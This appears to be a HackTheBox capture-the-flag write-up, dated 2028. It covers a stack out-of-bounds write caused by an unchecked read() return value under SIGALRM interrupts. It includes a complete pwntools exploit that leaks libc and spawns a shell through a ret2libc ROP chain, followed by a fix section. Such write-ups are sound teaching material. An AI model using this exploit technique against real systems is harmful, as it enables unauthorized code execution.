---
layout: post
title: "Ancient Interface"
date: 2028-01-25 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, eintr, ret2libc, rop, buffer-overflow, signals]
---

## Overview

Ancient Interface is a Medium **Pwn** challenge. It hands you a tiny shell-like binary that understands five commands — `alarm`, `echo`, `read`, `vars`, `whoami`. The `read` command looks bounded and safe, but it never checks the return value of `read()`. Combine that with the `alarm` command's signal delivery and the "safe" read turns into an [out-of-bounds stack write](https://cwe.mitre.org/data/definitions/787.html). The flag even spells out the lesson: *should have checked read's return value*.

## The technique

The vulnerable input loop in `cmd_read` accumulates bytes like this:

```c
int32_t off = 0;
uint32_t amnt = atoi(params);              // 1..0xfff, looks bounded
do {
    off += read(0, buf + off, amnt - off); // never checks for -1
} while (off != amnt);
```

`read()` returns `-1` (with `errno == EINTR`) when a signal interrupts the blocking call and the handler was installed **without `SA_RESTART`**. The `alarm <seconds>` command arms POSIX timers whose `SIGALRM` handler is registered exactly that way. So if a timer fires while `read()` is blocking:

- `off += -1` drives the signed counter **negative**,
- the next iteration writes at `buf + off` (i.e. *below* `buf`) with count `amnt - off` (grown).

`strace` makes it undeniable — five alarms fired here:

```
read(0, 0x7ffd...370, 8)   = ? ERESTARTSYS   --- SIGALRM ---
read(0, 0x7ffd...36f, 9)   = ? ERESTARTSYS   --- SIGALRM ---
read(0, 0x7ffd...36e, 10)  = ? ERESTARTSYS   ...
read(0, "AAAAAAAABBBBB", 13) = 13            # base = buf-5, count = 8+5
```

This is [CWE-252](https://cwe.mitre.org/data/definitions/252.html) (unchecked return value) leading straight to a [stack out-of-bounds write](https://cwe.mitre.org/data/definitions/121.html). After **N** interruptions `off == -N`, so an `amnt+N`-byte payload is written starting at `buf-N`. With `amnt = 8` and `N ≈ 48` a 56-byte ROP chain lands so that `cmd_read` returns into it (offset 8 = the saved-return slot).

The binary is No-PIE, NX, Partial RELRO — **and it has a stack canary** — yet the canary is never validated: the write goes *below* the buffer and control is taken before the function epilogue's canary check ever runs. No-PIE means absolute `.text`/GOT addresses work directly, and a libc leak defeats ASLR.

## Solution

The exploit is a two-stage ret2libc over a single connection.

**Get the alarms to fire during the read.** Arm 48 timers, then issue `read 8 q`, then wait for every `SIGALRM` to interrupt the read before sending the payload. The alarm delay must *exceed* the wall time of the arming loop — trivial locally (~0.3 s), but **~9 s over the network**, so use `alarm 11+` remotely and sleep long enough.

**Stage 1** leaks libc by calling `puts(printf@GOT)`, then returns to `_start` (`0x401290`) to cleanly restart `main` for a second round. **Stage 2** calls `system("/bin/sh")`.

Save `solve.py`:

```python
from pwn import *

context.binary = elf = ELF('ancient_interface', checksec=False)
PROMPT = b'user@host$ '
HOST, PORT = sys.argv[1], int(sys.argv[2])
libc = ELF(sys.argv[3], checksec=False)

pop_rdi = 0x401d43
ret     = 0x40101a
start   = 0x401290          # _start: cleanly restarts main() for stage 2
ALARM, WAIT = 11, 13        # remote timing: delay > 9s arm-loop, wait > last alarm

def fire_and_send(p, payload):
    for _ in range(48):
        p.sendlineafter(PROMPT, b'alarm %d' % ALARM)
    p.sendlineafter(PROMPT, b'read 8 q')            # amnt = 8
    sleep(WAIT)                                      # let every SIGALRM interrupt the read
    p.sendline(payload.ljust(8 + 48, b'A'))         # 56-byte write at buf-48

def parse_leak(p):
    data = p.recvrepeat(2).replace(b'Alarm has been hit!\n\x00', b'')
    i = data.find(b'\x7f\n')
    return u64(data[i - 5:i + 1].ljust(8, b'\0')) if i >= 5 else None

def resync(p):                                       # the _start restart eats the fresh prompt
    p.sendline(b'')                                  # ret<=1 -> continue -> re-emits a prompt
    p.recvuntil(PROMPT, timeout=8)

p = remote(HOST, PORT)

# Stage 1: leak printf@GOT, restart via _start
fire_and_send(p, b'A'*8 + p64(pop_rdi) + p64(elf.got['printf']) + p64(elf.plt['puts']) + p64(start))
printf_addr = parse_leak(p)
libc.address = printf_addr - libc.sym['printf']
log.success('libc base @ %#x' % libc.address)

# Stage 2: ret2libc system("/bin/sh")
resync(p)
binsh = next(libc.search(b'/bin/sh\x00'))
fire_and_send(p, b'A'*8 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(libc.sym['system']))
sleep(0.5); p.recvrepeat(1)
p.sendline(b'cat flag.txt')
p.interactive()
```

Run it against the instance with the matching libc (Ubuntu 20.04 glibc 2.31 — `libc6_2.31-0ubuntu9.10`, identified from `printf`'s low-12 bits `0xc90`):

```bash
python3 solve.py <host> <port> libc6_2.31-0ubuntu9.10_amd64.so
```

A shell as `ctf` drops out, and `cat flag.txt` returns `HTB{...}` (redacted).

Two gotchas that cost real time:

1. **The `_start` restart eats the prompt.** After stage 1 leaks and restarts `main`, the fresh prompt is consumed while parsing the leak, so stage 2's first `sendlineafter(PROMPT, …)` hangs forever. Poke the read loop with an empty line (`ret <= 1 → continue` re-emits a prompt) to re-sync before re-arming.
2. **The exploit is racy — retry.** The winning stack layout depends on the alarms landing during the read; on a fresh connection it works within a handful of attempts.

## Why it worked

`read()` (and `recv()`) can return `-1` on `EINTR` or a short count. A signed accumulator that blindly does `off += read(...)` underflows into a negative index the moment a signal interrupts the call — turning a bounded copy into an out-of-bounds write. The `alarm` command supplied the signal; the missing `SA_RESTART` supplied the `EINTR`; the unchecked return value supplied the bug.

## Fix / defense

Check every `read()`/`recv()` return value, and don't mix a signed offset with an unsigned length:

```c
size_t off = 0;
while (off < amnt) {
    ssize_t r = read(0, buf + off, amnt - off);
    if (r <= 0) { if (errno == EINTR) continue; break; }
    off += r;
}
```

Install signal handlers with `SA_RESTART` so blocking syscalls auto-resume, and use an unsigned offset with an explicit `r <= 0` guard before adding it. The root weakness is [CWE-252 (unchecked return value)](https://cwe.mitre.org/data/definitions/252.html); the impact is a [stack-based out-of-bounds write](https://cwe.mitre.org/data/definitions/121.html).
